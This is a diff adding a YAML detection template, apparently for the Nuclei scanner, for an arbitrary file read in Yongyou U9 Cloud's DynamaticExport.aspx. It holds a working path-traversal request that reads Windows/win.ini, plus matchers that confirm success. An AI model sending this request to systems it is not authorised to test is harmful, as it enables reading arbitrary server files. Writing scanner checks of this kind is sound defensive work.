@@ -1,0 +1,29 @@
+id: poc-yaml-yongyou-u9-dynamaticexport-aspx-anyfile-read
+info:
+  name: Yongyou U9 Cloud DynamaticExport.aspx Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,yongyou-u9
+http:
+  - raw:
+      - |
+        GET /print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[files]"
+          - "[fonts]"
+        part: body
+      - type: word
+        words:
+          - "filename=win.ini"
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
